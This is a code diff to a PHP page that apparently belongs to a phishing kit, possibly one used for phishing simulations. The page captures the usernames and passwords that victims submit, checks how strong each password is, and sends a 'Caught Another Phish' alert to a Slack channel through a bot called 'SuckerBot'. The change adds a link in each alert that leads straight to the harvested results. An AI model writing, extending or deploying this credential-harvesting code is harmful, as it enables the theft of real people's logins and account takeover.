@@ -6,6 +6,9 @@ $slackchannel = "#SLACK_CHANNEL";
 $slackemoji = ":see_no_evil:";
 $slackbotname = "SuckerBot";
 
+// Your API URL Here (https://This web site)
+$APIURI = "https://YOUR_API_HERE";
+
 // Receives Required Parameters and Sets Variables
 $ip = $_SERVER['REMOTE_ADDR'];
 $user = $_REQUEST['username'];
@@ -70,6 +73,9 @@ window.top.location.href = "<?php echo $redirect; ?>";
 
 <?php
 
+// Compose URL for Slack Message to Take Directly to Results
+$slacklink = $APIURI."/results/index.php?project=".$portal;
+
 // Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
 if($user != ""){
 
@@ -84,12 +90,12 @@ if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", $pass)){
 }
 
 // If the Password is Set, Change Slack Message
-$message = "Caught Another Phish at ".$portal."! (".$user.")\r\nPassword Strength is ".$passstrength;
+$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\nPassword Strength is ".$passstrength;
 
 } else {
 
 // If the Password is Not Set, Do Not Include Password Strength in Slack Message
-$message = "Caught Another Phish at ".$portal."! (".$user.")";
+$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";
 
 }
 
